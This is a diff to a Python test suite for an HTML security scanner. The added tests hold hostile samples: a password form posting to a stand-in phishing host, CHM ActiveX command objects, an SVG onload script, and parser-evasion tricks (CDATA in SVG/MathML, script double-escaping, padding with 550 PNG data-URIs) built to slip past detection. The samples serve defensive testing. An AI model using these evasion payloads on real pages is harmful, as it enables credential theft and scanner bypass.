@@ -825,7 +825,7 @@ def test_review_r10_regressions_foreign_breakout_caps_and_endtag_runtime(
             b'<!DOCTYPE html><html><body><math><mtext><textarea><x a="</textarea>'
             + chm
             + b'<!--"--></mtext></math></body></html>',
-            b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html"><![CDATA[>'
+            b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html"><div><![CDATA[>'
             + cred
             + b"</annotation-xml></math></body></html>",
             b"<!DOCTYPE html><html><body><svg></p><![CDATA[>" + cred + b"</body></html>",
@@ -843,3 +843,62 @@ def test_review_r10_regressions_foreign_breakout_caps_and_endtag_runtime(
     t0 = time.perf_counter()
     _scan(tmp_path, "r10_adv_end.html", adv_end)
     assert time.perf_counter() - t0 < 2.0
+
+
+def test_review_r11_regressions_ip_cdata_double_escaped_script_and_png_starvation(
+    tmp_path: Path,
+) -> None:
+    chm = (
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+    )
+    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'
+
+    # Blocker 1: WHATWG §13.2.5.42 true CDATA directly inside SVG/MathML integration points
+    ip_cases = (
+        b'<!DOCTYPE html><html><body><svg><foreignObject><![CDATA[ ><x a=" ]]>'
+        + chm
+        + b'<!--"--></foreignObject></svg></body></html>',
+        b'<!DOCTYPE html><html><body><svg><title><![CDATA[ ><x a=" ]]>'
+        + cred
+        + b'<!--"--></title></svg></body></html>',
+        b'<!DOCTYPE html><html><body><svg><desc><![CDATA[ ><x a=" ]]>'
+        + chm
+        + b'<!--"--></desc></svg></body></html>',
+        b'<!DOCTYPE html><html><body><math><mtext><![CDATA[ ><x a=" ]]>'
+        + chm
+        + b'<!--"--></mtext></math></body></html>',
+        b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html">'
+        b'<![CDATA[ ><x a=" ]]>'
+        + cred
+        + b'<!--"--></annotation-xml></math></body></html>',
+    )
+    for idx, doc in enumerate(ip_cases):
+        found = _rule_ids(_scan(tmp_path, f"r11_ip_cdata_{idx}.html", doc))
+        assert ("HTML_CHM_ACTIVEX" in found) or ("HTML_CREDENTIAL_FORM" in found), f"ip {idx}: {found}"
+
+    # Blocker 2: HTML5 <script> double-escaped state (<!--<script></script>...--></script>)
+    double_esc = (
+        b'<!DOCTYPE html><html><body>'
+        b'<script><!--<script></script><x a="--></script>'
+        + chm
+        + b'<!--"--></body></html>'
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r11_double_esc.html", double_esc))
+
+    # Major 3: 550 distinct benign PNG data-URIs before compact data:text/html & data:image/svg+xml
+    png_raw = _minimal_png()
+    pngs = "".join(
+        f"<img src='data:image/png;base64,{base64.b64encode(png_raw + bytes([i % 256, i // 256])).decode()}'>"
+        for i in range(550)
+    )
+    form_b64 = base64.b64encode(cred).decode("ascii")
+    assert len(form_b64) < 128
+    svg_b64 = base64.b64encode(b"<svg onload='alert(1)'/>").decode("ascii")
+    starve_doc = (
+        f"<!DOCTYPE html><body>{pngs}"
+        f'<iframe src="data:text/html;base64,{form_b64}"></iframe>'
+        f'<object data="data:image/svg+xml;base64,{svg_b64}"></object></body></html>'
+    ).encode()
+    found_s = _rule_ids(_scan(tmp_path, "r11_png550.html", starve_doc))
+    assert {"HTML_CREDENTIAL_FORM", "SVG_SCRIPT"} <= found_s
